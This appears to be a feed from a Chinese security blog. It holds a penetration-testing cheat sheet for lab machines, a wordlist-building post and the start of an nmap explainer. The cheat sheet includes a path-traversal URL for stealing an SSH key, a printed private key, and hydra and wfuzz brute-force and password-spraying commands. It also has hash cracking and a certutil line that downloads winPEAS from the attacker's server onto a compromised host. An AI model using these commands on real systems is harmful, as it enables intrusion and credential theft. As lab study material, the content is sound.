-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo bash -c <span style="color:#e6db74">&#39;echo &#34;10.129.187.74 conversor.htb&#34; &gt;&gt; /etc/hosts&#39;</span>
-</span></span></code></pre></div><h3 id="关于-id_rsa">关于 id_rsa</h3>
-<p>访问 <code>http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519</code> 尝试下载他们的 <code>id_rsa</code> 文件</p>
-<pre tabindex="0"><code class="language-id_rsa" data-lang="id_rsa">-----BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDPFoJGv5
-iCd2KL8Mk98VRJAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIJhikYx00CYMUNJ
-bkfs15NSAgTKVW07Aw2N4nxQ/RZ6AAAAoAj0NoVnW97AXPxNpphTUEKgehTfW3KWvX/9ps
-AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
-Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
-ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
------END OPENSSH PRIVATE KEY-----
-</code></pre><p>值得注意的是，下载 <code>id_rsa</code> 是失败的，需要下载 <code>id_ed25519</code>；<code>id_ed25519</code> 是现代 SSH 推荐的 <code>Ed25519</code> 算法私钥文件。</p>
-<h3 id="爆破相关">爆破相关</h3>
-<h4 id="目录爆破">目录爆破</h4>
-<h5 id="dirb">Dirb</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo dirb https://10.10.10.10
-</span></span></code></pre></div><h5 id="gobuster">Gobuster</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,php.bak,jsp,zip,tar,html,txt,tar,tar.gz,git,js,md
-</span></span></code></pre></div><p>POST 爆破</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster dir -u http://driver.htb -U admin -P admin -x php -w /usr/share/wordlists/dirb/common.txt
-</span></span></code></pre></div><h5 id="feroxbuster">Feroxbuster</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo feroxbuster -u http://driver.htb -x php -H <span style="color:#e6db74">&#34;Authorization: Basic YWRtaW46YWRtaW4=&#34;</span> 
-</span></span></code></pre></div><h5 id="ffuf">Ffuf</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.230.159:3000/?FUZZ<span style="color:#f92672">=</span>value -fs <span style="color:#ae81ff">81</span>
-</span></span></code></pre></div><h4 id="关于子域名爆破">关于子域名爆破</h4>
-<h5 id="gobuster-1">Gobuster</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo gobuster vhost -u http://10.129.230.193 --domain crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t <span style="color:#ae81ff">100</span>
-</span></span></code></pre></div><ul>
-<li>vhost：指定虚拟主机枚举模式</li>
-<li>&ndash;domain：指定基础域名</li>
-<li>-k：跳过 <code>SSL/TLS</code> 证书验证</li>
-<li>-r：自动跟随重定向</li>
-<li>-t 100：设置并发线程为 100</li>
-</ul>
-<h4 id="ffuf-1">Ffuf</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ffuf -H <span style="color:#e6db74">&#34;Host: FUZZ.soulmate.htb&#34;</span> -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac
-</span></span></code></pre></div><ul>
-<li>-H：添加自定义 <code>HTTP</code> 请求头</li>
-<li>Host: FUZZ.soulmate.htb：设置 <code>Host</code> 头部</li>
-<li>FUZZ：<code>ffuf</code> 的关键占位符</li>
-<li>-ac：自动校准模式</li>
-</ul>
-<h4 id="登入认证破解">登入认证破解</h4>
-<h5 id="nmap">Nmap</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ sudo nmap -p80 --script<span style="color:#f92672">=</span>http-brute 10.129.5.91  
-</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-02-28 08:11 EST
-</span></span><span style="display:flex;"><span>Stats: 0:08:01 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
-</span></span><span style="display:flex;"><span>NSE Timing: About 0.00% <span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>Stats: 0:08:47 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Script Scan
-</span></span><span style="display:flex;"><span>NSE Timing: About 0.00% <span style="color:#66d9ef">done</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.5.91
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.095s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
-</span></span><span style="display:flex;"><span>80/tcp open  http
-</span></span><span style="display:flex;"><span>| http-brute: 
-</span></span><span style="display:flex;"><span>|   Accounts: 
-</span></span><span style="display:flex;"><span>|     admin:admin - Valid credentials
-</span></span><span style="display:flex;"><span>|_  Statistics: Performed <span style="color:#ae81ff">45009</span> guesses in <span style="color:#ae81ff">535</span> seconds, average tps: 84.6
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 535.72 seconds
-</span></span></code></pre></div><h4 id="暴力破解">暴力破解</h4>
-<h5 id="hashcat">Hashcat</h5>
-<p>破解 <code>MD5</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> hash/hash.lst /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>破解 <code>7z</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">11600</span> -a <span style="color:#ae81ff">0</span> 7z_hash.txt /usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>查看破解过的 <code>hash</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hashcat -m <span style="color:#ae81ff">0</span> --show hash/hash.lst
-</span></span></code></pre></div><h5 id="hydra">Hydra</h5>
-<p>破解多个用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L users.txt -P wordlist.txt
-</span></span></code></pre></div><p>破解单个用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;aaa&#34;</span> -P wordlist.txt
-</span></span></code></pre></div><p>破解 Web POST</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l <span style="color:#e6db74">&#34;key&#34;</span> -P /usr/share/wordlists/rockyou.txt 10.10.10.7 http-form-post <span style="color:#e6db74">&#34;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&#34;</span>
-</span></span></code></pre></div><p>FTP 密码喷射</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L hash/users.lst -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.35 -f
-</span></span></code></pre></div><p>SSH 密码喷射</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l sword -P passwords.txt ssh://10.10.10.5 -t <span style="color:#ae81ff">30</span> -V
-</span></span></code></pre></div><p>破解登入框</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -l shaldon -P password.txt -f 10.10.10.39 -s <span style="color:#ae81ff">80</span> http-get /the_real_secret_dir
-</span></span></code></pre></div><h5 id="ffuf-2">Ffuf</h5>
-<p>破解 Web POST</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hc 404,401 -d <span style="color:#e6db74">&#34;username=admin&amp;password=FUZZ&#34;</span> http://driver.htb
-</span></span></code></pre></div><h5 id="john">John</h5>
-<p>破解 <code>hash</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo john hash/hash.lst --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>破解 <code>id_rsa</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/john/ssh2john.py hash/id_rsa &gt; crack.txt  
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt id_rsa     
-</span></span></code></pre></div><p>破解 7z</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/usr/share/john/7z2john.py backup.7z &gt; 7z_hash.txt
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john 7z_hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>破解 zip</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/sbin/zip2john flag.zip &gt; flag.txt
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john flag.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
-</span></span></code></pre></div><p>生成更好的字典</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -rules -wordlist<span style="color:#f92672">=</span>password.txt - stdout | sort | uniq &gt; wordlist.txt
-</span></span></code></pre></div><h3 id="共享目录相关">共享目录相关</h3>
-<h4 id="mount">Mount</h4>
-<p>检查共享目录</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>showmount -e 10.10.10.13
-</span></span></code></pre></div><p>连接共享目录</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo mount -t nfs 10.10.10.13:/home/karl attact
-</span></span></code></pre></div><h4 id="smbclient">Smbclient</h4>
-<p>列出 SMB 共享</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient -N -L <span style="color:#ae81ff">\\\\</span>10.10.10.10
-</span></span></code></pre></div><p>连接到 SMB 共享</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.10<span style="color:#ae81ff">\\</span>enil
-</span></span></code></pre></div><h4 id="nxc">NXC</h4>
-<p>使用 nxc 进行 SMB 共享枚举，尝试使用空密码进行匿名登入。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ nxc smb driver.htb --shares -u enil -p <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>SMB         10.129.5.91     <span style="color:#ae81ff">445</span>    DRIVER           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> Build <span style="color:#ae81ff">10240</span> x64 <span style="color:#f92672">(</span>name:DRIVER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:DRIVER<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:True<span style="color:#f92672">)</span> 
-</span></span><span style="display:flex;"><span>SMB         10.129.5.91     <span style="color:#ae81ff">445</span>    DRIVER           <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DRIVER<span style="color:#ae81ff">\e</span>nil: STATUS_LOGON_FAILURE
-</span></span></code></pre></div><h3 id="缓冲区溢出">缓冲区溢出</h3>
-<h4 id="msf">Msf</h4>
-<p>创建 600 字节缓冲区</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_crate -l <span style="color:#ae81ff">600</span>
-</span></span></code></pre></div><p>确定字节</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-pattern_offset -l <span style="color:#ae81ff">600</span> -q <span style="color:#ae81ff">35724134</span>
-</span></span></code></pre></div><p>jum esp</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf-nasm_shell
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>jmp esp
-</span></span></code></pre></div><h3 id="嗅探">嗅探</h3>
-<h4 id="responder">Responder</h4>
-<h3 id="命令行解密">命令行解密</h3>
-<h4 id="base64">base64</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;NURHR1EtUExWNDEtSFk4MUYtR0dOM0Y=&#34;</span> | base64 -d
-</span></span><span style="display:flex;"><span>5DGGQ-PLV41-HY81F-GGN3F
-</span></span></code></pre></div><h3 id="135-rcp">135 RCP</h3>
-<p>连接 135 rcp 端口。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ rpcclient -U <span style="color:#e6db74">&#39;&#39;</span> -N 10.129.5.91
-</span></span><span style="display:flex;"><span>Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
-</span></span></code></pre></div><ul>
-<li>-U 指定用户名参数，使用空字符串表示匿名用户</li>
-<li>-N 表示不使用密码进行认证</li>
-</ul>
-<h3 id="nc">Nc</h3>
-<p>遇见非常规端口一般使用 nc 尝试进行交互，例如 DeathStar 靶机，开放了 UDP 1440 端口，尝试使用 nc 进行交互获得回显。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
-</span></span><span style="display:flex;"><span>?
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Wrong Code!!
-</span></span><span style="display:flex;"><span>We<span style="color:#960050;background-color:#1e0010">&#39;</span>ll notify Commander Tarkin of this offense
-</span></span></code></pre></div><p>使用 echo 传输字符串并通过 nc 链接端口。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;DS-1@OBS&#34;</span> | nc -u 10.10.10.45 <span style="color:#ae81ff">1440</span>
-</span></span><span style="display:flex;"><span>......
-</span></span></code></pre></div><h3 id="加密识别">加密识别</h3>
-<h4 id="nth">Nth</h4>
-<pre tabindex="0"><code>nth --file Test
-</code></pre><h3 id="传输文件">传输文件</h3>
-<h4 id="windows">Windows</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\p</span>rogramdata<span style="color:#ae81ff">\a</span>pps&gt; certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://10.10.16.155:8000/winPEASx64.exe&#34;</span> .
-</span></span><span style="display:flex;"><span>****  Online  ****
-</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">000000</span>  ...
-</span></span><span style="display:flex;"><span>  9b3200
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>CertUtil: -URLCache command completed successfully.
-</span></span></code></pre></div>]]></content></item><item><title>如何根据具体的目标定制字典</title><link>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</link><pubDate>Thu, 09 Oct 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/%E5%A6%82%E4%BD%95%E6%A0%B9%E6%8D%AE%E5%85%B7%E4%BD%93%E7%9A%84%E7%9B%AE%E6%A0%87%E5%AE%9A%E5%88%B6%E5%AD%97%E5%85%B8/</guid><description>在遇到目标网站且使用 kali 默认的 rockyou 字典爆破时间过长时可以尝试通过 cewl 与 john 结合生成目标定制的字典缩短爆破时间。
-可能使用到的 Cewl 及 john 命令及解释 Cewl 语句及其解释 sudo cewl http://10.10.10.48 -w password.txt 这个命令直接指定 url 生成一个包含所有提取单词的字典文件，并保存为 password.txt 文件。
-sudo cewl -m 6 http://10.10.10.48 -w password.txt 这个命令使用 -m 6 设置提取的单词长度最小为 6 。
-sudo cewl -d 2 http://10.10.10.48 -w password.txt 这个命令使用 -d 2 使 Cewl 递归爬取网站内部链接，深度为 2 。
-sudo cewl -c http://10.10.10.48 -w password.txt 这个命令使用 -c 去除重复单词，并显示单词出现的次数。
-sudo cewl -e http://10.10.10.48 -w password.txt 这个命令使用 -e 保留所有发现的电子邮件地址。</description><content type="html"><![CDATA[<p>在遇到目标网站且使用 <em>kali</em> 默认的 <em>rockyou</em> 字典爆破时间过长时可以尝试通过 <em>cewl</em> 与 <em>john</em> 结合生成目标定制的字典缩短爆破时间。</p>
-<h2 id="可能使用到的-cewl-及-john-命令及解释">可能使用到的 Cewl 及 john 命令及解释</h2>
-<h3 id="cewl-语句及其解释">Cewl 语句及其解释</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cewl http://10.10.10.48 -w password.txt 
-</span></span></code></pre></div><p>这个命令直接指定 <em>url</em> 生成一个包含所有提取单词的字典文件，并保存为 <em>password.txt</em> 文件。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cewl -m <span style="color:#ae81ff">6</span> http://10.10.10.48 -w password.txt 
-</span></span></code></pre></div><p>这个命令使用 <em>-m 6</em> 设置提取的单词长度最小为 <em>6</em> 。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cewl -d <span style="color:#ae81ff">2</span> http://10.10.10.48 -w password.txt 
-</span></span></code></pre></div><p>这个命令使用 -d 2 使 <em>Cewl</em> 递归爬取网站内部链接，深度为 <em>2</em> 。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cewl -c http://10.10.10.48 -w password.txt 
-</span></span></code></pre></div><p>这个命令使用 <em>-c</em> 去除重复单词，并显示单词出现的次数。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo cewl -e http://10.10.10.48 -w password.txt 
-</span></span></code></pre></div><p>这个命令使用 -<em>e</em> 保留所有发现的电子邮件地址。</p>
-<h3 id="john-语法及其解释">john 语法及其解释</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo john --rules -wordlist<span style="color:#f92672">=</span>password.txt --stdout | sort | uniq &gt; wordlist.txt
-</span></span></code></pre></div><p>使用 <em>&ndash;rules</em> 指定内置密码规则生成新密码组合，<em>&ndash;wordlist=password.txt</em> 指定原始字典为 <em>passowrd.txt</em> ，使用 <em>&ndash;stdout</em> 将生成的密码标准输出，<em>sort</em> 对单词进行排序，<em>uniq</em> 去重。</p>
-<h2 id="使用-hydra-指定生成的字典进行爆破">使用 hydra 指定生成的字典进行爆破</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo hydra -L users.txt -P wordlist.txt 10.10.10.48 http-get /nagios
-</span></span></code></pre></div><p><img src="result.png" alt="结果"></p>
-]]></content></item><item><title>Nmap 扫描原理与使用心得</title><link>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</link><pubDate>Wed, 24 Sep 2025 21:00:00 +0800</pubDate><guid>https://enilmalus.github.io/posts/nmap-%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/</guid><description>以下命令均以 kali本地地址为 10.10.10.5，靶机地址为 10.10.10.45 为案例
-nmap 扫描原理解析 nmap 的操作系统识别依赖于比较目标主机与关闭端口探测包的不同回应模式：开放端口会返回正常的握手或服务应答，而关闭端口则常见 RST 或 ICMP 拒绝，不同操作系统内核再这些细节（如 TCP、标志位、TTL、窗口大小、ICMP 码值）上存在差异，nmap 需要同时采集 “接受” 和 “拒绝” 两类样本，才能与指纹库准确比对。如果缺少关闭端口的反馈，就丢失了一半的特征维度，指纹信息不足，结果往往只能模糊匹配甚至误判，因此 nmap 会提示 “OSScan results may be unreliable”。
